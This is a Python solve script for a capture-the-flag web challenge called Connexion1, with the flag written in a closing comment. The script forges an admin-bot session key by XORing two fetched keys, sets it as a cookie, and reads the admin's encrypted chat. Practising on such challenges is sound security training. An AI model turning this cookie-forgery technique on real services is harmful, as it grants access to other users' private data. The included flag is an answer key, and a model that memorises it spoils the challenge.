# Second part of Connexion1

#!/usr/bin/env python3
from pwn import xor
from base64 import b64decode
from Crypto.Cipher import AES
import requests, os, re

url = "http://connexion.challs.olicyber.it/"
username, password = os.urandom(16).hex(), os.urandom(16).hex()
regex = r"U[a-zA-Z0-9\/\+]*?="
regex2 = r'chat\/\d*?\/\d*?"'

s = requests.Session()
s.post(url + "signin", data = {
    "username": username, 
    "password": password
    })
s.post(url + "login", data = {
    "username": username, 
    "password": password
    })

id = s.get(url + "homepage").text
id = str(re.findall(regex2, id)[0])
id = id[id.find('/')+1:id.index('/', id.find('/')+1)]

key_me_admin = s.get(url + f"getkey/{id}/1").text
key_me_admin = key_me_admin[key_me_admin.find('k')+1:key_me_admin.find('k')+76]
key_me_bot = s.get(url + f"getkey/{id}/2").text
key_me_bot = key_me_bot[key_me_bot.find('k')+1:key_me_bot.find('k')+76]

key_admin_bot = 'k' + xor(bytes.fromhex(key_me_admin), bytes.fromhex(key_me_bot)).hex()
s.cookies.set("/getkey/1/2", key_admin_bot, path="/chat/1")

flag = s.get(url + "chat/1/2").text
encrypted = b64decode(re.findall(regex, flag)[0])
key_admin_bot = bytes.fromhex(key_admin_bot[1:])

# eval js print("ptm{no7_th3_r1ght_way_t0_xor_7hing5}")